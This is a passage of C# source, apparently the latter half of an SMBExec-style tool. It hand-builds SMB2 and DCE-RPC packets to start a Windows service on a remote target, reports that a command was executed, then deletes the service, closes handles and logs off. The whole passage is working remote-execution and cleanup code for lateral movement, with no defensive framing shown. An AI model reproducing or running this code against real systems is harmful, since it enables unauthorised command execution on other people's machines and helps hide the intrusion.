                                            SMB2_message_ID += 20;
                                            packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                            packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                            if (SMB_signing)
                                            {
                                                packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                            }
                                            OrderedDictionary packet_SCM_data = SMBExec.SCMStartServiceW(SMB_service_context_handle);
                                            SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                            OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x13, 0x00 }, null);
                                            byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                            OrderedDictionary packet_SMB2_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                            byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                            int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                            OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                            byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                            if (SMB_signing)
                                            {
                                                HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                                byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                                byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                                SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                                packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                                SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                            }
                                            SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                            SMBClientStage = "ReadRequest";
                                            SMB_client_stage_next = "DeleteServiceW";
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 132, 135)) == "31-04-00-00")
                                        {
                                            if (debug) { output.AppendLine(String.Format("Service {0} creation failed on {1}", SMB_service, target)); }
                                            SMBExec_failed = true;
                                        }
                                        else
                                        {
                                            if (debug) { output.AppendLine("Service Creation Fault Context Mismatch."); }
                                            SMBExec_failed = true;
                                        }
                                    }
                                    break;

                                case "DeleteServiceW":
                                    {
                                        if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "1d-04-00-00")
                                        {
                                            output.AppendLine(String.Format("Command executed with service {0} on {1}", SMB_service, target));
                                        }
                                        else if (BitConverter.ToString(Utilities.GetByteRange(SMBClientReceive, 108, 111)) == "02-00-00-00")
                                        {
                                            output.AppendLine(String.Format("Service {0} failed to start on {1}", SMB_service, target));
                                        }

                                        SMB2_message_ID += 20;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        OrderedDictionary packet_SCM_data = SMBExec.SCMDeleteServiceW(SMB_service_context_handle);
                                        SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "ReadRequest";
                                        SMB_client_stage_next = "CloseServiceHandle";
                                        SMB_close_service_handle_stage = 1;
                                    }
                                    break;

                                case "CloseServiceHandle":
                                    {
                                        OrderedDictionary packet_SCM_data;
                                        if (SMB_close_service_handle_stage == 1)
                                        {
                                            Console.WriteLine("Service {0} deleted on {1}", SMB_service, target);
                                            SMB2_message_ID += 20;
                                            SMB_close_service_handle_stage++;
                                            packet_SCM_data = SMBExec.SCMCloseServiceHandle(SMB_service_context_handle);
                                        }
                                        else
                                        {
                                            SMB2_message_ID++;
                                            SMBClientStage = "CloseRequest";
                                            packet_SCM_data = SMBExec.SCMCloseServiceHandle(SMB_service_manager_context_handle);
                                        }
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x09, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        SCM_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SCM_data);
                                        OrderedDictionary packet_RPC_data = SMBExec.RPCRequest(new byte[] { 0x03 }, SCM_data.Length, 0, 0, new byte[] { 0x01, 0x00, 0x00, 0x00 }, new byte[] { 0x00, 0x00 }, new byte[] { 0x02, 0x00 }, null);
                                        byte[] RPC_data = Utilities.ConvertFromPacketOrderedDictionary(packet_RPC_data);
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2WriteRequest(SMB_file_ID, RPC_data.Length + SCM_data.Length);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        int RPC_data_length = SMB2_data.Length + SCM_data.Length + RPC_data.Length;
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, RPC_data_length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).Concat(RPC_data).Concat(SCM_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);

                                    }
                                    break;
                                case "CloseRequest":
                                    {
                                        SMB2_message_ID += 20;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x06, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }

                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2CloseRequest(SMB_file_ID);
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "TreeDisconnect";
                                    }
                                    break;

                                case "TreeDisconnect":
                                    {
                                        SMB2_message_ID++;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x04, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2TreeDisconnectRequest();
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "Logoff";
                                    }
                                    break;
                                case "Logoff":
                                    {
                                        SMB2_message_ID += 20;
                                        packet_SMB2_header = SMBExec.SMB2Header(new byte[] { 0x02, 0x00 }, SMB2_message_ID, SMB2_tree_ID, SMB_session_ID);
                                        packet_SMB2_header["SMB2Header_CreditRequest"] = new byte[] { 0x7f, 0x00 };
                                        if (SMB_signing)
                                        {
                                            packet_SMB2_header["SMB2Header_Flags"] = new byte[] { 0x08, 0x00, 0x00, 0x00 };
                                        }
                                        OrderedDictionary packet_SMB2_data = SMBExec.SMB2SessionLogoffRequest();
                                        byte[] SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        byte[] SMB2_data = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_data);
                                        OrderedDictionary packet_netBIOS_session_service = SMBExec.NetBIOSSessionService(SMB2_header.Length, SMB2_data.Length);
                                        byte[] NetBIOS_session_service = Utilities.ConvertFromPacketOrderedDictionary(packet_netBIOS_session_service);
                                        if (SMB_signing)
                                        {
                                            HMACSHA256 HMAC_SHA256 = new HMACSHA256();
                                            byte[] SMB2_Sign = SMB2_header.Concat(SMB2_data).ToArray();
                                            byte[] SMB2_Signature = HMAC_SHA256.ComputeHash(SMB2_Sign);
                                            SMB2_Signature = Utilities.GetByteRange(SMB2_Signature, 0, 15);
                                            packet_SMB2_header["SMB2Header_Signature"] = SMB2_Signature;
                                            SMB2_header = Utilities.ConvertFromPacketOrderedDictionary(packet_SMB2_header);
                                        }
                                        SMB_client_send = NetBIOS_session_service.Concat(SMB2_header).Concat(SMB2_data).ToArray();
                                        SMBClientReceive = SendStream(SMBClientStream, SMB_client_send);
                                        SMBClientStage = "exit";
                                    }
                                    break;
                            }
                        }
                    }

                }
                SMBClient.Close();
                SMBClientStream.Close();
            }


            return output.ToString();
        }

        private static byte[] SendStream(NetworkStream stream, byte[] BytesToSend)
        {
            byte[] BytesReceived = new byte[2048];
            stream.Write(BytesToSend, 0, BytesToSend.Length);
            stream.Flush();
            stream.Read(BytesReceived, 0, BytesReceived.Length);
            return BytesReceived;
        }
    }
}

